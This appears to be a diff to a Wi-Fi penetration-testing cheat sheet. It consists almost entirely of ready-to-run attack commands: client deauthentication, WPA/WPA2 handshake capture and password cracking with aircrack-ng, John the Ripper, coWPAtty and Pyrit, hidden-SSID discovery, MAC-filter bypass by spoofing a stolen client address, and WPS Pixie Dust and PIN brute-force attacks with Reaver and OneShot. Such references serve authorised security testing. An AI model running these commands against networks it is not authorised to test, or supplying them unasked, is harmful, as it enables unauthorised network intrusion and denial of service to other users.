@@ -140,52 +140,40 @@ aircrack-ng <capture>
 
 ```
 Troubleshooting
-
 During a Sharing Key Authentication Bypass attack, if once you deauthenticate a client you got a “Broken SKA” message instead of the “140 bytes keystream : ” into your Airodump output. Try to restart the Airodump-ng capture and deauthenticate another client.
 ```
 
 ```
 Cracking WPA/WPA2 PSK
 WPA – Crack
-
 Start by placing your wireless card into monitor mode on the channel number of the AP:
-
 airmon-ng start <interface> <AP channel>
 
 Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:
-
 airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
 
 Deauthenticate a connected client to force it to complete the 4-way handshake:
-
 aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
 
 Crack the WPA password with Aircrack-ng :
-
 aircrack-ng -w <wordlist> <capture>
 
 Alternatively, if you have an Airolib-ng database, it can be passed to Aircrack:
-
 aircrack-ng -r <db name> <capture>
 ```
 
 ```
 Aircrack-ng and John The Ripper
-
 Place your wireless card into monitor mode on the channel number of the AP:
-
 airmon-ng start <interface> <AP channel>
 
 Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:
-
 airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
 
 Force a client to reconnect and complete the 4-way handshake by running a deauthentication attack against it:
-
 aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
 
 Once a handshake has been captured, change to the John the Ripper directory and pipe in the mangled words into Aircrack-ng to obtain the WPA password:
-
 ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
 ```
 
@@ -193,27 +181,21 @@ Once a handshake has been captured, change to the John the Ripper directory and 
 coWPAtty
 
 Place your wireless card into monitor mode on the channel number of the AP:
-
 airmon-ng start <interface> <AP channel>
 
 Start an Airodump capture, filtering on the AP channel and BSSID, saving the file to disk:
-
 airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
 
 Deauthenticate a connected client to force it to complete the 4-way handshake:
-
 aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
 
 To crack the WPA password with coWPAtty in wordlist mode:
-
 cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>
 
 To use rainbow table mode with coWPAtty, first generate the hashes:
-
 genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
 
 Run coWPAtty with the generated hashes to recover the WPA password:
-
 cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
 ```
 
@@ -221,32 +203,114 @@ cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
 Pyrit
 
 Place your wireless card into monitor mode on the channel number of the AP:
-
 airmon-ng start <interface> <AP channel>
 
 Use Pyrit to sniff on the monitor mode interface, saving the capture to a file:
-
 pyrit -r <interface> -o <capture> stripLive
 
 Deauthenticate a connected client to force it to complete the 4-way handshake:
-
 aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
 
 Run Pyrit in dictionary mode to crack the WPA password:
-
 pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough
 
 To use Pyrit in database mode, begin by importing your wordlist:
-
 pyrit -i <wordlist> import_passwords
 
 Add the ESSID of the access point to the Pyrit database:
-
 pyrit -e <ESSID> create_essid
 
 Generate the PMKs for the ESSID:
-
 pyrit -r <capture> -b <AP MAC> attack_db
 ```
 
+```
+Find Hidden SSID
+Set your wireless card in monitor mode.
+sudo airmon-ng start <wireless card>
 
+Monitor access point.
+sudo airodump-ng <monitor wireless card>
+
+Detect the BSSID of the hidden ESSID that you are targeting, rerun the scan specifying that BSSID and the channel.
+sudo airodump-ng -c <channel> --bssid <bssid> <monitor wireless card>
+
+Now you can deauth a device.
+sudo aireplay-ng -0 15 -c <client bssid> -a <access point bssid> <monitor wireless card>
+```
+
+```
+Bypass MAC Filtering
+Set your wirelss card in monitor mode.
+sudo airmon-ng start <wireless card>
+
+Monitor access point.
+airodump-ng -c <channel> --bssid <bssid> -w <output file> <monitor wireless card>
+
+Deauthenticate a client and remember his MAC address.
+aireplay-ng -0 0 -a <BSSID> -c <Client> <monitor wireless card>
+
+Shutdown you’r monitor interface.
+ifconfig <monitor wireless card> down
+
+Attribute the Client MAC address to your wireless card.
+macchanger --mac <deauthed client MAC address> <monitor wirelss card>
+
+Power up you’r wireless card.
+ifconfig <monitor wireless card>
+
+Launch you’r attack using the stolen MAC address. ARP Replay request in this case.
+aireplay-ng -3 -b <bssid> -h <stolen MAC address> <monitor wireless card>
+```
+
+```
+WPS Attacks
+Reaver – WPS Attacks
+Pixie Dust Attack
+
+Install Reaver
+sudo apt-get install reaver
+
+Set wireless card in monitor mode
+sudo airmon-ng start <wirless card>
+
+Enumerate Wireless Point using wash
+wash -i <monitor wireless card>
+
+Execute pixie dust attack
+reaver -i <monitor wireless card> -b <bssid> -vv -K 1
+
+Specific Pin Attack
+Note : The parameter -S is used to use small DH keys to improve crack speed
+reaver -i <monitor wireless card> -b <bssid> -vv -p <PinCode> -S
+
+5GHz Target
+Note : Target 5GHz with the “-5” parameter. Example using Pixie Dust Attack bellow.
+reaver -i <monitor wireless card> -b <bssid> -5 -vv -K 1
+
+Bully – WPS Attacks
+OneShot – WPS Attacks without Monitor Mode Enabled
+Installation
+Refere to https://github.com/drygdryg/OneShot if needed.
+sudo apt install -y python3 wpasupplicant iw wget
+sudo apt install -y pixiewps
+cd ~
+mkdir oneshot && cd oneshot
+wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py
+wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt
+
+Pixie Dust Attack
+python3 oneshot.py -b <bssid> wlan0 -K
+
+Pixie Force Attack with delay of 5 seconds for each attempt
+python3 oneshot.py -b <bssid> wlan0 -F -d 5
+
+Online Bruteforce
+python3 oneshot.py -b <bssid> wlan0 -b
+
+Custom Pin
+python3 oneshot.py -b <bssid> wlan0 -p 12345678
+
+Using WPS Button
+python3 oneshot.py -b <bssid> wlan0 --pbc
+```
